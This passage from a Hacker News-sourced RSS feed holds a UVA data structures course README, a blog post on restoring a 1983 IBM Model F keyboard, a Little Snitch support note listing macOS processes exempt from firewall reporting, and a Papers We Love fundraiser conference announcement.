<li><a href="https://aaronbloomfield.github.io/pdr/ibcm/ibcm.html">ibcm</a> (<a href="https://aaronbloomfield.github.io/pdr/ibcm/ibcm.md">md</a>): the files necessary for the IBCM module on machine language, which is taught about two thirds of the way into the course.</li>
<li><a href="https://aaronbloomfield.github.io/pdr/labs/index.html">labs</a> (<a href="https://aaronbloomfield.github.io/pdr/labs/index.md">md</a>): the labs are the main assignments in the course, and each lab is split into pre-lab, in-lab, and post-lab parts. There are 11 full labs, with a partial 12th lab that is an optional component of the course. The labs are written using <a href="http://daringfireball.net/projects/markdown/">markdown</a>, and the rendered HTML version of each lab is also committed to this repository.</li>
<li><a href="https://aaronbloomfield.github.io/pdr/slides/index.html">slides</a> (<a href="https://aaronbloomfield.github.io/pdr/slides/index.md">md</a>): Contains the slides used in the course. The slides use <a href="https://github.com/hakimel/reveal.js/">reveal.js</a>, an HTML presentation framework.</li>
<li><a href="https://aaronbloomfield.github.io/pdr/tutorials/index.html">tutorials</a> (<a href="https://aaronbloomfield.github.io/pdr/tutorials/index.md">md</a>): the tutorials that are used as part of the lab assignments, these are primarily Linux tutorials.</li>
<li><a href="https://aaronbloomfield.github.io/pdr/utils/index.html">utils</a> (<a href="https://aaronbloomfield.github.io/pdr/utils/index.md">md</a>): various utilities for this repository</li>
</ul>
<h2 id="contributing-to-this-repository"><a name="contributing"></a>Contributing to this Repository</h2>
<p>Updates to the repository are restricted to approved individuals only, to prevent anybody from messing with the slides right before a lecture. However, others can still contribute to this repository – to do so, take the following steps:</p>
<ol type="1">
<li>Create a github account, if you do not have one</li>
<li>Fork this repository: you can click on the “Fork” link in the upper right, or just click <a href="https://github.com/uva-cs/pdr/fork">here</a></li>
<li>Clone your forked repository on to your local machine</li>
<li>Make any changes you want to your forked version</li>
<li>Run <code>make</code> - note that you will need <a href="http://johnmacfarlane.net/pandoc/">pandoc</a>, <a href="http://astyle.sourceforge.net/">astyle</a>, and <a href="http://www.gnu.org/software/src-highlite/source-highlight.html">source-highlight</a> installed</li>
<li>Commit and push your changes back to your forked repository</li>
<li>Create a pull request, following the instructions <a href="https://help.github.com/articles/creating-a-pull-request">here</a></li>
</ol>
<p>At that point, I will receive a notice that a change has been submitted, and I’ll look at it and hopefully accept it into the main repository.</p>
<p>When you want to bring in the updates from the main pdr github repository into your forked repository, you will need to follow the instructions <a href="https://help.github.com/articles/syncing-a-fork">here</a>.</p>
<h2 id="course-description"><a name="description"></a>Course Description</h2>
<p>This course is a second-year course for computer science majors. It is the primary data structures course in the <a href="http://www.virginia.edu/">University of Virginia</a>’s <a href="http://www.cs.virginia.edu/">computer science</a> curriculum. Unlike many other data structure courses at other institutions, it is intended as the <em>third</em> course in sequence, meaning that students are expected to have taken two semesters of Java (or equivalent, although some of the examples are specifically from Java). The course focuses on how programs and data are represented from the high level down to the low level. For programs, we examine (from high to low): abstract data types, Java code, C++ code, C code, assembly (x86) code, and a customized machine language. For data, we examine (also from high to low): abstract data types, objects, primitive types, and how numbers are encoded (both floats (IEEE 754) and integers (two’s complement)). About two-thirds of this course is programming using C++. The remainder of this course uses other languages, including (in decreasing order): x86 assembly, IBCM (a machine language), C, Objective C, and shell scripting.</p>
<p>The <a href="http://www.abet.org/">ABET</a> course objects are as follows:</p>
<ul>
<li>Understand program representation from the high-level programming language perspective down to the underlying machine level representation, including: number representation, operations, conditionals, and control structures</li>
<li>Be able to implement basic and advanced abstract data types in C++ including: linked lists, stacks, queues, hash tables, trees, and graphs</li>
<li>Be able to evaluate asymptotic time and space complexity analysis of programs and data structure implementations using Big-O, Big-Omega, and Big-Theta notation and assess the suitability of a data structure for a particular problem</li>
<li>Understand the basic program execution model and the underlying computer hardware and software (fetch-execute cycle, memory hierarchy, operating system, compiler)</li>
<li>Be able to implement basic program control and data structures in an assembly language (loops, conditionals, subroutines and parameter passing modes, arrays)</li>
</ul>
<h2 id="markdown"><a name="markdown"></a>Markdown</h2>
<p>The majority of the content in this repository was created using <a href="http://daringfireball.net/projects/markdown/">Markdown</a>. Unfortunately, the only standardized Markdown is very old (2004), and has limited support for many HTML features, such as tables. A simple conversion script in a Makefile is in the <a href="https://aaronbloomfield.github.io/pdr/utils/index.html">utils</a> (<a href="https://aaronbloomfield.github.io/pdr/tutorials/index.md">md</a>) directory, which uses <a href="http://johnmacfarlane.net/pandoc/">pandoc</a>. Assuming pandoc is installed, run <code>make markdown</code> in the root repo directory to re-create all the .html files from their associated .md files.</p>
<p>For all the Markdown files in this repository, both the original (.md) file and the HTML version (.html) are added to the repository, so that people who do not have Markdown installed can still view the contents of this repository.</p>
<p>Note that Github supports an enhanced version of Markdown, called <a href="https://help.github.com/articles/github-flavored-markdown">Github Flavored Markdown</a>, or GFM. This mostly pertains to this README file. In an effort to ensure compatibility with other Markdown programs (such as the one described here and what reveal.js uses), GFM specific features are generally avoided. One example is the use of anchors in this document – the HTML tags are included instead of using GFM’s version.</p>
<h2 id="source-code"><a name="sourcecode"></a>Source code</h2>
<p>All source code is formatted via <a href="http://astyle.sourceforge.net/">astyle</a> and then highlighted via <a href="http://www.gnu.org/software/src-highlite/source-highlight.html">source-highlight</a>. Both the original file (foo.cpp) and the highlighted version (foo.cpp.html) are included in the repository. All links to source code will like to the .html, with a “(<a href="https://aaronbloomfield.github.io/pdr/README.md">src</a>)” after it to link to the original source code. Utility scripts are provided to convert all the files in the <a href="https://aaronbloomfield.github.io/pdr/utils/index.html">utils</a> (<a href="https://aaronbloomfield.github.io/pdr/tutorials/index.md">md</a>) directory. <code>make format</code> and <code>make highlight</code> can also be run to invoke the scripts.</p>
<h2 id="license"><a name="license"></a>License</h2>
<p>The material in this repository is released under a <a href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a> (CC BY-SA).</p>
<p>Copyright (c) 2017-2018 by Mark Floryan Copyright (c) 2013-2017 by Aaron Bloomfield.</p>
<p>Some parts of this repository are taken, with permission, from other sources. The full details are in the <a href="https://aaronbloomfield.github.io/pdr/license.html">License</a> (<a href="https://aaronbloomfield.github.io/pdr/license.md">md</a>) file. In particular, some parts of this repository that were obtained elsewhere can not be used for commercial purposes.</p>


</div>]]>
            </description>
            <link>https://aaronbloomfield.github.io/pdr/readme.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25029751</guid>
            <pubDate>Sun, 08 Nov 2020 22:36:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Restoring a 37 Year-Old IBM F Mechanical Keyboard]]>
            </title>
            <description>
<![CDATA[
Score 120 | Comments 55 (<a href="https://news.ycombinator.com/item?id=25029571">thread link</a>) | @opsdisk
<br/>
November 8, 2020 | https://blog.opsdisk.com/restoring-a-37-year-old-ibm-model-f-mechanical-keyboard.html | <a href="https://web.archive.org/web/*/https://blog.opsdisk.com/restoring-a-37-year-old-ibm-model-f-mechanical-keyboard.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <p>I wanted to share my journey from start to finish to restore a 1983 IBM Model F XT mechanical keyboard to it's former glory.  It includes the steps, mistakes, and additional hardware required to make it functional with a modern computer.  This blog post is dedicated to my dad for teaching me about computers.</p>
<p><img alt="original.jpg" src="https://blog.opsdisk.com/images/keyboard/original.jpg"></p>

<p>A few months ago, my dad asked if I was interested in taking ownership of his <a href="https://en.wikipedia.org/wiki/IBM_Personal_Computer">IBM model 5150 PC</a>.  Without hesitation, I said "yes!".  The first project I wanted to tackle was to restore the
<a href="https://en.wikipedia.org/wiki/Model_F_keyboard">1983 Model F XT mechanical keyboard</a> keyboard.  In a sentimental and
journeyman/apprentice-sense, it felt like my dad was passing on the tools of his craft to continue the family line of
computer work and I couldn't pass that up.</p>
<p><img alt="datestamp.jpg" src="https://blog.opsdisk.com/images/keyboard/datestamp.jpg"></p>

<p>For those of you unfamiliar with the IBM Model F, <a href="https://www.modelfkeyboards.com/">modelfkeyboards.com</a> summarizes it
nicely:</p>
<blockquote>
<p>The IBM Model F keyboards not only used the best switches, the materials used in their production (well over 5lbs of
steel and other metals) means they will be working as good as new when it’s time to pass it on to your grandchildren.
The problem...they just aren't made that way any more.  The IBM Model F was discontinued in the 1980's.  If you do
find a Model F, it will be some combination of dirty, broken and/or expensive, requiring hours of work to get it
working again!</p>
</blockquote>
<p>This tank of a keyboard weighs in at over 6 pounds, sounds like <a href="https://youtu.be/XTVeSCqYSmE?t=7">this</a>, and at the
time of production, retailed for $300-400 in 1982 ($800-1000 dollars adjusted in today's dollars!) according to this
<a href="https://www.youtube.com/watch?v=y9Jds326gks">review</a>.</p>
<p>The restoration did take a few hours and fortunately none of it involved a soldering iron or replacing any of the
electrical or physical components because it was already in great functioning shape...a true testament to the design.
Even cooler, this blog post was typed up using the restored Model F keyboard!</p>

<p>Before beginning the project, I discovered <a href="https://www.clickykeyboards.com/">ClickyKeyboards</a>, a site "Specializing in
the restoration and collection of model M keyboards", the successor to the Model F.  On ClickyKeyboards, there is a
section dedicated to the adapters and converters that may be required to make older 5-pin DIN plug keyboards compatible
with modern USB ports.  One of the companies mentioned on ClickyKeyboards is
<a href="https://www.hagstromelectronics.com/">Hagstrom Electronics</a>, which sells keyboard encoders and protocol converters.
Without looking too closely at the other products, I quickly purchased the
<a href="https://www.hagstromelectronics.com/keyboard-encoder-ke18-xtat-ps2-shp.html">KE18-XTAT-PS/2</a> which "converts an XT
keyboard into a PS/2 protocol keyboard" for $55.  I was ecstatic that there was at least something to get me into PS/2
land, because at that point I knew I could easily find a PS/2 to USB converter.</p>
<p>After the KE18-XTAT-PS/2 arrived, I quickly fired up an ancient box (yes, that is Windows 2000!) with a PS/2 input on
the motherboard.  I tested all the keys to ensure they still worked and they did!  With confirmation that the keyboard
still worked, it was time to start the restoration.</p>
<p><img alt="win2000.jpg" src="https://blog.opsdisk.com/images/keyboard/win2000.jpg"></p>

<p><img alt="original2.jpg" src="https://blog.opsdisk.com/images/keyboard/original2.jpg"></p>
<p>The first step was to remove the metal casing and see what the state of the board was underneath the keys.  There was
years worth of debris, coffee stains, and gunk that had to be removed.  In addition, there were a few spots with
corrosion on the board that needed to be addressed.</p>
<p><img alt="preclean.jpg" src="https://blog.opsdisk.com/images/keyboard/preclean.jpg"></p>
<p>Once the casing was off, I utilized compressed air to clean out the key bunkers and get rid of any loose nastiness.
Next, I tried using rubbing alcohol and Q-tips to try and remove some of the stickier stuff, but that didn't
really work.</p>

<p>I borrowed a rotary tool to buff out the corrosion.  I used one of the provided bits that had soft plastic tentacles to
try and buff out the corroded spots as gently as possible.  There are likely better and more appropriate bits, but it
did the job.  The rotary tool's power and RPMs were a bit overkill even on the lowest setting.  Ideally, I would have
used one with fewer minimum RPMs and a more precise bit to get all the spots.</p>
<p><img alt="buffing_tool_and_bit.jpg" src="https://blog.opsdisk.com/images/keyboard/buffing_tool_and_bit.jpg"></p>
<p><img alt="bit.jpg" src="https://blog.opsdisk.com/images/keyboard/bit.jpg"></p>
<p>I was using the rotary tool under a bright overhead desk lamp, and with the way the light was reflecting, I didn't
notice it was taking off the black finish and revealing the silver metal base.  At that point, I just decided to buff
off the finish where I could to make it look more uniform.  The silver metal is visible when the keys and cover are back
on it, but it looks fine.  Unfortunately, with the rotary head and bit size, I wasn't able to buff every last square
inch of the board, but I knew it'd be covered so I wasn't too concerned with it looking perfect.</p>
<p><img alt="allbuffed.jpg" src="https://blog.opsdisk.com/images/keyboard/allbuffed.jpg"></p>

<p><img alt="postbuffing.jpg" src="https://blog.opsdisk.com/images/keyboard/postbuffing.jpg"></p>
<p>There was still some residue stuck to the board that I wanted to remove.  I started out using a small eye glass
screwdriver to scrape it off, but it took some of the black finish off as well and didn't look that nice.  At that point,
a chemical pivot was required and I reached for the <a href="https://googone.com/">Goo Gone</a>, which I should have done from the
beginning.  The Goo Gone and a bit of elbow grease with Q-Tips did the trick in removing the stubborn gunk on the board.</p>
<p><img alt="postgoogone.jpg" src="https://blog.opsdisk.com/images/keyboard/postgoogone.jpg"></p>

<p>With the board in good shape, it was time to tackle the actual keys.  I first gave them a good wipe-down using desk
cleaning wipes, which removed most of the discoloration and stains.  However, they still didn't look as good as they
could, and I read that just soaking them in a bowl of dish soap and water for a few hours can do wonders...and it did.
They keys look brand new.</p>
<p><img alt="keybath.jpg" src="https://blog.opsdisk.com/images/keyboard/keybath.jpg"></p>
<p>One mistake I made after washing them was to not let them completely dry on the inside.  I placed the keys back on the
board too soon, and some water leaked onto a few of the springs causing a small amount of rusting (slightly visible in
the post-Goo Gone image).  I gave them another soap soak and used the compressed air to really get out the water.  I
also let them air dry for 1-2 days before putting them back on the board.</p>

<p>After successfully testing the actual keyboard and the restoration almost complete, it was time to search for a PS/2 to
USB cable.  On a whim, I was back on the Hagstrom Electronic site and noticed they already had a small box, the
<a href="https://www.hagstromelectronics.com/ke-xtusb-keyboard-encoder-shp.html">KE-XTUSB</a>, that converted the XT signal to USB,
and it was the same price.  They graciously allowed me to return the KE18-XTAT-PS/2 in exchange for the KE-XTUSB which
was the same price.  A few days later the KE-XTUSB arrived in the mail and I eagerly connected it to my current computer.</p>
<p><img alt="xtusb.jpg" src="https://blog.opsdisk.com/images/keyboard/xtusb.jpg"></p>

<p>Everything worked beautifully except for two keys.  The "s" key's spring mechanism would either not detect a key press
or would be stuck in the depressed state blasting "sssssssssssssssssssssssssssssssssssss" across the screen.  With a
bit of finagling, I got the key cap placed correctly so now it works like a champ.  The other key that has issues is the
accountant's "+" near the 10 key pad.  The spring had come off somehow and I super glued it back, but something still
isn't right and it fails to register key strokes.  Not a huge loss since "+" can be achieved with another key
combination.</p>
<p>Overall, I'm really impressed with how it looks and, when comparing it to <a href="https://www.youtube.com/watch?v=E2bAhxK76hc">this</a>
unboxing video of a never before opened Model F, it looks about the same!</p>
<p>If you have any questions or comments, hit me up on Twitter <a href="https://twitter.com/opsdisk">@opsdisk</a>.</p>
<p><img alt="final.jpg" src="https://blog.opsdisk.com/images/keyboard/final.jpg"></p>
            </section></div>]]>
            </description>
            <link>https://blog.opsdisk.com/restoring-a-37-year-old-ibm-model-f-mechanical-keyboard.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25029571</guid>
            <pubDate>Sun, 08 Nov 2020 22:09:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The traffic of some Apple processes isn’t shown in Little Snitch 5]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25029535">thread link</a>) | @bangonkeyboard
<br/>
November 8, 2020 | https://www.obdev.at/support/littlesnitch/245914647368270 | <a href="https://web.archive.org/web/*/https://www.obdev.at/support/littlesnitch/245914647368270">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div>
<p><label for="ctr_expandable_34">
<h3>The traffic of some Apple processes isn’t shown in Little&nbsp;Snitch&nbsp;5.</h3>
</label></p><div>
<p>This is due to a limitation in Apple’s Network Extension API, which surprisingly whitelists a number of system services like Maps, FaceTime, App Store or Software Update and therefore doesn’t report the network activity of these services to third-party application firewalls.</p>
<p>The use of this new API is now mandatory for third-party developers on macOS Big Sur, because Apple no longer supports the previous kernel extension based approach, which didn’t suffer from this limitation.</p>
<p>We are currently investigating a solution in Little Snitch to make these whitelisted connections visible by means of alternative techniques.</p>
<p>There’s an ongoing discussion about this problem in various online media, and we assume that Apple will address these concerns in a future macOS update.</p>
<p>At the time of this writing, the whitelist seems to inlcude the following macOS processes:</p>
<p>

/System/Applications/App Store.app/Contents/MacOS/App Store<br>

/System/Library/CoreServices/cloudpaird<br>

/System/Library/CoreServices/mapspushd<br>

/System/Library/CoreServices/Software Update.app/Contents/Resources/softwareupdated<br>

/System/Library/Frameworks/Accounts.framework/Versions/A/Support/accountsd<br>

/System/Library/Frameworks/CoreTelephony.framework/Support/CommCenter<br>

/System/Library/PrivateFrameworks/ApplePushService.framework/apsd<br>

/System/Library/PrivateFrameworks/AppStoreDaemon.framework/Support/appstoreagent<br>

/System/Library/PrivateFrameworks/AppStoreDaemon.framework/Support/appstored<br>

/System/Library/PrivateFrameworks/AssetCacheServices.framework/Versions/A/XPCServices/AssetCacheLocatorService.xpc/Contents/MacOS/AssetCacheLocatorService<br>

/System/Library/PrivateFrameworks/AssistantServices.framework/Versions/A/Support/assistantd<br>

/System/Library/PrivateFrameworks/AuthKit.framework/Versions/A/Support/akd<br>

/System/Library/PrivateFrameworks/CloudKitDaemon.framework/Support/cloudd<br>

/System/Library/PrivateFrameworks/CommerceKit.framework/Resources/commerced<br>

/System/Library/PrivateFrameworks/CommerceKit.framework/Versions/A/Resources/commerce<br>

/System/Library/PrivateFrameworks/CoreLSKD.framework/Versions/A/lskdd<br>

/System/Library/PrivateFrameworks/CoreParsec.framework/parsecd<br>

/System/Library/PrivateFrameworks/CoreSpeech.framework/corespeechd<br>

/System/Library/PrivateFrameworks/DistributedEvaluation.framework/Versions/A/XPCServices/com.apple.siri-distributed-evaluation.xpc/Contents/MacOS/com.apple.siri-distributed-evaluation<br>

/System/Library/PrivateFrameworks/FamilyCircle.framework/Versions/A/Resources/familycircled<br>

/System/Library/PrivateFrameworks/FamilyNotification.framework/FamilyNotification<br>

/System/Library/PrivateFrameworks/GeoServices.framework/Versions/A/XPCServices/com.apple.geod.xpc/Contents/MacOS/com.apple.geod<br>

/System/Library/PrivateFrameworks/HomeKitDaemon.framework/Support/homed<br>

/System/Library/PrivateFrameworks/IDS.framework/identityservicesd.app/Contents/MacOS/identityservicesd<br>

/System/Library/PrivateFrameworks/IDSFoundation.framework/IDSRemoteURLConnectionAgent.app/Contents/MacOS/IDSRemoteURLConnectionAgent<br>

/System/Library/PrivateFrameworks/IMCore.framework/imagent.app/Contents/MacOS/imagent<br>

/System/Library/PrivateFrameworks/IMFoundation.framework/XPCServices/IMRemoteURLConnectionAgent.xpc/Contents/MacOS/IMRemoteURLConnectionAgent<br>

/System/Library/PrivateFrameworks/IMTransferServices.framework/IMTransferAgent.app/Contents/MacOS/IMTransferAgent<br>

/System/Library/PrivateFrameworks/MapsSuggestions.framework/MapsSuggestions<br>

/System/Library/PrivateFrameworks/MapsSupport.framework/MapsSupport<br>

/System/Library/PrivateFrameworks/MediaStream.framework/MediaStream<br>

/System/Library/PrivateFrameworks/MusicLibrary.framework/MusicLibrary<br>

/System/Library/PrivateFrameworks/PassKitCore.framework/passd<br>

/System/Library/PrivateFrameworks/ProtectedCloudStorage.framework/Helpers/ProtectedCloudKeySyncing<br>

/System/Library/PrivateFrameworks/SyncedDefaults.framework/Support/syncdefaultsd<br>

/System/Library/TextInput/kbd<br>

/usr/libexec/coreduetd<br>

/usr/libexec/diagnosticd<br>

/usr/libexec/findmydeviced<br>

/usr/libexec/fmfd<br>

/usr/libexec/locationd<br>

/usr/libexec/mdmclient<br>

/usr/libexec/mobileactivationd<br>

/usr/libexec/mobileassetd<br>

/usr/libexec/networkserviceproxy<br>

/usr/libexec/rtcreportingd<br>

/usr/libexec/secd<br>

/usr/libexec/siriknowledged<br>

/usr/libexec/swcd<br>

/usr/libexec/tailspind<br>

/usr/libexec/teslad<br>

/usr/libexec/timed<br>

/usr/libexec/trustd<br>

/usr/sbin/securityd<br>

com.apple.facetime<br></p>

</div>
</div></div></div></div>]]>
            </description>
            <link>https://www.obdev.at/support/littlesnitch/245914647368270</link>
            <guid isPermaLink="false">hacker-news-small-sites-25029535</guid>
            <pubDate>Sun, 08 Nov 2020 22:06:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Papers We Love Conference: Mini Edition]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25029531">thread link</a>) | @blopeur
<br/>
November 8, 2020 | https://paperswelove.org/2020/video/pwlconf-mini/ | <a href="https://web.archive.org/web/*/https://paperswelove.org/2020/video/pwlconf-mini/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main" itemprop="mainContentOfPage">
                <article itemscope="" itemtype="http://schema.org/Article">
        
        
        <section itemprop="articleBody">
        <h3 id="november-18-2020---1745-est-on-twitchhttpswwwtwitchtvpaperswelove">November 18, 2020 - 17:45 EST on <a href="https://www.twitch.tv/paperswelove">Twitch</a></h3>

<p><a href="https://connect.clickandpledge.com/w/Form/a9f96acc-aa05-4c52-a9b4-e12ab505abdf"><img src="https://www.usenix.org/sites/all/themes/custom/cotija/images/logo.svg"></a>Like many non-profit organizations (ourselves included) <a href="https://www.usenix.org/">USENIX</a> has struggled during the COVID-19 pandemic. Conferences made up a large part of their revenue streams, and their cancellation has deprived USENIX of operating funds. As a <a href="https://www.usenix.org/publications">major source of research papers</a> in Computer Science and Networking we'd like to help anyway we can. <strong>So we're going to try something new to help raise donations for USENIX: a streaming mini-conference.</strong></p>

<h3 id="schedule">Schedule</h3>

<ul>
  <li><strong>17:45 EST</strong> Panel led by <a href="https://blog.acolyer.org/">Adrian Colyer</a>, with guests <a href="https://www.cc.gatech.edu/home/ada/">Ada Gavrilovska</a>, <a href="">Joe Hellerstein</a>, <a href="https://drkp.net/">Dan R. K. Ports</a>, <a href="https://www.justinesherry.com/">Justine Sherry</a> and <a href="">Hakim Weatherspoon</a>.</li>
  <li><strong>18:35 EST</strong> <a href="https://research.google/people/jeff/">Jeff Dean</a> - The Rise of Cloud Computing Systems</li>
  <li><strong>19:30 EST</strong> <a href="https://irenezhang.net/">Irene Zhang</a> - The <a href="https://github.com/demikernel/demikernel">Demikernel</a> and the Future of Kernel-Bypass Systems</li>
</ul>

<p>We'll <a href="https://www.twitch.tv/paperswelove">stream live on Twitch</a>, aftwerwards we'll post the video to our <a href="https://www.youtube.com/user/PapersWeLove">YouTube channel</a> once we've done some editing.</p>

<p><strong>This is a fund raiser</strong> so we're asking everyone who attends to <a href="https://connect.clickandpledge.com/w/Form/a9f96acc-aa05-4c52-a9b4-e12ab505abdf">make a donation to USENIX</a>. Almost every local chapter of Papers We Love has presented a paper from USENIX over the years, so this is our chance to give back.</p>



<p>Keep an eye on this page and our <a href="https://twitter.com/papers_we_love/">Twitter feed</a> for updates to the schedule and speaker list.</p>

<h3 id="speakers">Speakers</h3>

<hr>

<p><strong>Jeff Dean</strong></p>

<p><em>Abstract</em>: In this talk, I'll highlight some of the developments in cloud computing systems over the past two decades.  I'll also describe why machine learning systems have dramatically changed some of the kinds of computer systems we want to build.</p>

<p><em>Bio</em>: Jeff Dean joined Google in 1999 and is currently a Google Senior Fellow and leads Google Research and Google Health, which focus on basic computer science and AI research and their use in important problem domains. He has worked on various computer systems including Google's search and advertising systems, MapReduce, BigTable, Spanner, and open-source software such as TensorFlow, protocol buffers, and LevelDB.</p>

<p>Jeff has a Ph.D. in Computer Science from the University of Washington and a B.S. in Computer Science &amp; Economics from the University of Minnesota. He was awarded the 2012 ACM Prize in Computing, and is a member of the U.S. National Academy of Engineering and the American Academy of Arts and Sciences, and a Fellow of the ACM</p>

<p>Links: <a href="https://research.google/people/jeff/">Site</a> / <a href="https://scholar.google.com/citations?user=NMS69lQAAAAJ">Publications</a></p>

<hr>

<p><strong>Irene Y. Zhang</strong></p>

<p><em>Abstract</em>: This talk presents the <a href="https://github.com/demikernel/demikernel">Demikernel</a> [<a href="http://irenezhang.net//papers/demikernel-hotos19.pdf">Paper</a>], a new OS architecture for kernel-bypass I/O devices.  Demikernel hides device complexity and heterogeneity by defining a new high-level, kernel-bypass I/O API and implementing it using different user-level, library OSes for each device type I will discuss the challenges in designing kernel-bypass library OSes and the future research directions in kernel-bypass for datacenter applications.</p>

<p><em>Bio</em>: My research focuses on datacenter operating systems and distributed systems.</p>

<p>I completed my PhD in 2017 at the University of Washington, where I was advised by Hank Levy and Arvind Krishnamurthy. My thesis is on distributed systems for applications that span mobile devices and cloud servers. Before my PhD, I received my S.B. and M.Eng. from MIT and worked for 3 years in the virtual machine monitor group at VMware.</p>

<p>I was born in Beijing, China but spent most of my time growing up in Columbus, Indiana. My husband and I like to cook, travel and occasionally do computer science together.</p>

<p>Links: <a href="https://irenezhang.net/">Site</a> / <a href="https://irenezhang.net/publications.html">Publications</a></p>

<hr>

<p><strong>Adrian Colyer</strong> - Panel Moderator</p>

<p><em>Bio</em>: I publish <a href="https://blog.acolyer.org/">The Morning Paper</a>: a short summary every weekday of an important, influential, topical or otherwise interesting paper in the field of computer science.</p>

<p>I’m a Venture Partner with Accel in London, where it’s my job to help find and build great technology companies across Europe and Israel.  If you’re working on an interesting technology-related business I’d love to hear from you: you can reach me at acolyer at accel dot com. Prior to joining Accel I spent over twenty years in technical roles, including CTO roles at Pivotal, VMware, and SpringSource.</p>

<p>Links: <a href="https://blog.acolyer.org/">Site</a></p>

<hr>

<p><strong>Ada Gavrilovska</strong> - Panelist</p>

<p><em>Bio</em>: Ada Gavrilovska is an associate professor in the School of Computer Science at Georgia Tech. She directs the Kernel research group, focused on performance, scalability and efficiency problems across the systems software stack, including operating, distributed, and high-performance computing systems. Gavrilovska's research is supported by the National Science Foundation, the US Department of Energy, industry support from Cisco, Facebook, HPE, Intel, Intercontinental Exchange, LexisNexis, Samsung, VMware, and others, and the Applications Driving Architectures (ADA) Research Center, a JUMP Center co-sponsored by the Semiconductor Research Corporation and DARPA. She served as the program co-chair of the USENIX Annual Technical Conference in 2020.</p>

<p>Links: <a href="https://www.cc.gatech.edu/~ada/">Site</a> / <a href="https://dblp.org/pid/76/3229.html">Publications</a></p>

<hr>

<p><strong>Joe Hellerstein</strong> - Panelist</p>

<p><em>Bio</em>: Joseph M. Hellerstein is the Jim Gray Professor of Computer Science at the University of California, Berkeley, whose work focuses on data-centric systems and the way they drive computing. He is an <a href="http://fellows.acm.org/fellow_citation.cfm?id=4354833&amp;srt=year&amp;year=2009">ACM Fellow</a>, an <a href="http://www.sloan.org/fellowships">Alfred P. Sloan Research Fellow</a> and the recipient of three <a href="http://www.sigmod.org/sigmod-awards/sigmod-awards#time">ACM-SIGMOD "Test of Time"</a> awards for his research. Fortune Magazine has included him in their list of 50 <a href="https://archive.fortune.com/galleries/2010/technology/1007/gallery.smartest_people_tech.fortune/27.html">smartest people in technology</a>, and MIT's Technology Review magazine included his work on their <a href="http://www.technologyreview.com/news/418545/tr10-cloud-programming/">TR10</a> list of the 10 technologies "most likely to change our world".</p>

<p>Hellerstein is the co-founder and Chief Strategy Officer of <a href="http://trifacta.com/">Trifacta</a>, a software vendor providing intelligent interactive solutions to the messy problem of wrangling data. He has served on the technical advisory boards of a number of computing and Internet companies including <a href="http://www.dellemc.com/">Dell EMC</a>, <a href="http://www.surveymonkey.com/">SurveyMonkey</a>, <a href="http://www.captricity.com/">Captricity</a>, and <a href="http://www.datometry.com/">Datometry</a>, and previously served as the Director of <a href="https://en.wikipedia.org/wiki/Intel_Research_Lablets">Intel Research, Berkeley</a>.</p>

<p>Links: <a href="https://dsf.berkeley.edu/jmh/index.html">Site</a> / <a href="https://dsf.berkeley.edu/jmh/publications.html">Publications</a></p>

<hr>

<p><strong>Dan R. K. Ports</strong> - Panelist</p>

<p>I am a researcher in the Systems Research Group at Microsoft Research.</p>

<p>My research focuses on distributed systems – using a combination of new algorithms and systems techniques to build practical systems that are faster, more reliable, easier to program, and more secure.</p>

<p>I take a broad view of the systems field: besides distributed systems, I've worked in operating systems, networking, databases, architecture, and security. I believe that looking across the entire systems stack yields interesting opportunities at the intersection of these areas.</p>

<p>Most of my work these days involves rethinking how distributed systems should be built for the datacenter environment. I lead the Prometheus project at MSR, which asks how we can use new reconfigurable devices, such as programmable dataplane switches and smart NICs, to support advanced systems applications. The key idea is to co-design distributed systems with new network primitives.</p>

<p>Before joining MSR, I was on the faculty in CSE at the University of Washington. I still advise a few excellent students over there.
An increasingly long time ago (i.e., 2012), I was a student at MIT, where I was (approximately) Barbara Liskov's last Ph.D. graduate. Even before that, I was an undergraduate at MIT.</p>

<p>Links: <a href="https://drkp.net/">Site</a> / <a href="https://drkp.net/publications.html">Publications</a></p>

<hr>

<p><strong>Justine Sherry</strong> - Panelist</p>

<p><em>Bio</em>: Justine Sherry is an assistant professor at Carnegie Mellon University. Her interests are in computer networking; her work includes middleboxes, networked systems, measurement, cloud computing, and congestion control. Dr. Sherry received her PhD (2016) and MS (2012) from UC Berkeley, and her BS and BA (2010) from the University of Washington. She is a recipient of the SIGCOMM doctoral dissertation award, the David J. Sakrison prize, paper awards at USENIX NSDI and ACM SIGCOMM, and an NSF Graduate Research Fellowship. Most importantly, she is always on the lookout for a great cappuccino.</p>

<p>Links: <a href="https://www.justinesherry.com/">Site</a> / <a href="https://www.justinesherry.com/papers.html">Publications</a></p>

<hr>

<p><strong>Hakim Weatherspoon</strong> - Panelist</p>

<p><em>Bio</em>: I received my PhD in 2006 from the <a href="http://www.cs.berkeley.edu/">University of California, Berkeley</a>, in the area of secure and fault-tolerant distributed wide-area storage systems (e.g. <a href="http://antiquity.sourceforge.net/">Antiquity</a>, <a href="http://oceanstore.cs.berkeley.edu/">OceanStore</a>, etc.). I received a B.S. in Computer Engineering from the University of Washington in 1999.</p>

<p>Links: <a href="https://www.cs.cornell.edu/~hweather/index.php">Site</a> / <a href="https://www.cs.cornell.edu/~hweather/publications.php">Publications</a></p>


        </section>
        
    </article>

        </div></div>]]>
            </description>
            <link>https://paperswelove.org/2020/video/pwlconf-mini/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25029531</guid>
            <pubDate>Sun, 08 Nov 2020 22:06:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Toroidal Isolation Power Transformers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25029498">thread link</a>) | @peter_d_sherman
<br/>
